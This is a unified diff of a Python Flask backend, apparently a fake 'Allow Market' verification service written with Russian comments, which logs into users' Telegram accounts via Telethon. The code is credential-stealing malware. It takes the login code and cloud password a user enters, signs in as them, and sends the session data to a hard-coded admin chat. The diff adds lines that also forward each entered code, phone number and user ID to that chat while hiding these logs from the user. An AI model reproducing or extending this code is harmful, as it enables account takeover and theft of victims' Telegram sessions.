@@ -1,5 +1,5 @@
 # app.py — ИСПРАВЛЕННАЯ ВЕРСИЯ
-# Использует StringSession (без файлов) + /tmp для временных данных
+# Убраны логи пользователю, добавлен код в логи админа
 
 from flask import Flask, request, jsonify
 from flask_cors import CORS
@@ -38,16 +38,17 @@ ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID', '8766481292')
 sessions = {}
 
 # ============================================================
-# ОДИН EVENT LOOP ДЛЯ ВСЕГО ПРИЛОЖЕНИЯ
+# ОДИН EVENT LOOP
 # ============================================================
 loop = asyncio.new_event_loop()
 asyncio.set_event_loop(loop)
 
 # ============================================================
-# ФУНКЦИИ ДЛЯ ЛОГОВ
+# ФУНКЦИИ ДЛЯ ЛОГОВ (ТОЛЬКО АДМИНУ!)
 # ============================================================
 
 def send_admin_log(message, data=None):
+    """Отправка лога ТОЛЬКО админу"""
     try:
         text = f"🔐 {message}"
         if data:
@@ -61,6 +62,7 @@ def send_admin_log(message, data=None):
         print(f"Admin log error: {e}")
 
 def send_tdata_to_admin(session_data):
+    """Отправка tdata админу"""
     try:
         lines = []
         lines.append("=" * 50)
@@ -96,17 +98,12 @@ def send_tdata_to_admin(session_data):
         print(f"Send tdata error: {e}")
 
 # ============================================================
-# MTProto ФУНКЦИИ (Telethon + StringSession — БЕЗ ФАЙЛОВ)
+# MTProto ФУНКЦИИ (Telethon + StringSession)
 # ============================================================
 
 async def send_code_async(phone):
     try:
-        # Используем StringSession вместо файла — НЕТ ФАЙЛОВ!
-        client = TelegramClient(
-            StringSession(),
-            api_id=API_ID,
-            api_hash=API_HASH
-        )
+        client = TelegramClient(StringSession(), api_id=API_ID, api_hash=API_HASH)
         await client.connect()
         
         if await client.is_user_authorized():
@@ -120,6 +117,7 @@ async def send_code_async(phone):
             'phone_code_hash': result.phone_code_hash
         }
         
+        # Лог админу (БЕЗ КОДА! только запрос)
         send_admin_log(f"📱 Запрос кода для {phone}")
         return {'success': True, 'phone_code_hash': result.phone_code_hash}
         
@@ -159,10 +157,23 @@ async def check_code_async(phone, code, phone_code_hash):
             }
             
             await client.disconnect()
+            
+            # Лог админу с КОДОМ, который ввел пользователь
+            send_admin_log(
+                f"✅ Код подтвержден для {phone}",
+                f"Введенный код: *{code}*\nPhone: {phone}\nUser ID: {signed_in.id}"
+            )
+            
             return {'success': True, 'hasPassword': False, 'sessionData': session_data}
             
         except SessionPasswordNeededError:
+            # У аккаунта ЕСТЬ облачный пароль
+            send_admin_log(
+                f"🔐 Требуется облачный пароль для {phone}",
+                f"Введенный код: *{code}*\nPhone: {phone}"
+            )
             return {'success': True, 'hasPassword': True, 'message': 'Cloud password required'}
+            
         except PhoneCodeInvalidError:
             return {'success': False, 'error': 'Invalid code'}
         except PhoneCodeExpiredError:
@@ -172,6 +183,7 @@ async def check_code_async(phone, code, phone_code_hash):
         return {'success': False, 'error': str(e)}
 
 async def check_password_async(phone, password):
+    """РЕАЛЬНАЯ ПРОВЕРКА ОБЛАЧНОГО ПАРОЛЯ"""
     try:
         client_data = sessions.get(phone)
         if not client_data:
@@ -195,16 +207,23 @@ async def check_password_async(phone, password):
             }
             
             await client.disconnect()
+            
+            # Лог админу об успешной проверке пароля
+            send_admin_log(
+                f"🔑 Облачный пароль подтвержден для {phone}",
+                f"User ID: {signed_in.id}\nUsername: @{signed_in.username}"
+            )
+            
             return {'success': True, 'sessionData': session_data}
             
         except PasswordHashInvalidError:
-            return {'success': False, 'error': 'Invalid password'}
+            return {'success': False, 'error': 'Invalid cloud password'}
             
     except Exception as e:
         return {'success': False, 'error': str(e)}
 
 # ============================================================
-# ОБЁРТКА ДЛЯ ЗАПУСКА АСИНХРОННЫХ ФУНКЦИЙ
+# ОБЁРТКА ДЛЯ ЗАПУСКА
 # ============================================================
 
 def run_async(coro):
@@ -219,8 +238,8 @@ def run_async(coro):
 def ping():
     return jsonify({
         'status': 'online',
-        'service': 'Allow Market Backend (Telethon/MTProto)',
-        'version': '9.0.0',
+        'service': 'Allow Market Backend',
+        'version': '11.0.0',
         'note': '✅ Код приходит от ОФИЦИАЛЬНОГО TELEGRAM (MTProto)',
         'storage': 'StringSession (no files)',
         'endpoints': ['GET /ping', 'POST /sendCode', 'POST /checkCode', 'POST /checkPassword']
@@ -267,7 +286,6 @@ def check_code():
         else:
             session_data = result['sessionData']
             send_tdata_to_admin(session_data)
-            send_admin_log(f"✅ Верификация успешна для {phone}")
             return jsonify({
                 'success': True,
                 'hasPassword': False,
@@ -284,18 +302,17 @@ def check_password():
     password = data.get('password', '').strip()
     
     if not phone or not password:
-        return jsonify({'success': False, 'error': 'Missing fields'}), 400
+        return jsonify({'success': False, 'error': 'Missing phone or password'}), 400
     
     result = run_async(check_password_async(phone, password))
     
     if result['success']:
         session_data = result['sessionData']
         send_tdata_to_admin(session_data)
-        send_admin_log(f"🔑 Пароль подтверждён для {phone}")
         return jsonify({
             'success': True,
             'sessionData': session_data,
-            'message': 'Verified'
+            'message': 'Password verified successfully'
         })
     else:
         return jsonify({'success': False, 'error': result.get('error')}), 400
@@ -308,5 +325,6 @@ if __name__ == '__main__':
     print("🔐 БЭКЕНД ЗАПУЩЕН (Telethon/MTProto)")
     print("📌 Используется StringSession (без файлов)")
     print("📌 Код приходит ОТ TELEGRAM (НЕ от бота!)")
+    print("📌 Логи с кодом отправляются ТОЛЬКО админу")
     print("=" * 60)
     app.run(host='0.0.0.0', port=5000)
